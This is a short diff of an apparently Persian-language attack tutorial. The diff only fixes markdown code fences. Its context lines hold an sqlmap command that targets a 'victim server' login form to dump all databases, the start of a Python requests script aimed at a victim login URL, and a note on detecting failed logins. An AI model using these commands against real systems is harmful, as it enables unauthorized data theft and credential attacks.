@@ -51,6 +51,7 @@ sqlmap -u "http://IP-سرور-قربانی/login/" --data="username=admin&passwo
 
 ```
 sqlmap -u "http://IP-سرور-قربانی/login/" --data="username=admin&password=123" --method=POST --dump-all
+```
 
 # curl
 
@@ -75,7 +76,7 @@ F=login_failed.html: شرط تشخیص شکست (اگر این صفحه نمای
 2.  با یک اسکریپت پایتون ساده (اگر می‌خواهید خودتان بنویسید)
 
 
-```
+```python
 import requests
 
 target_url = "http://victim-ip/login/"
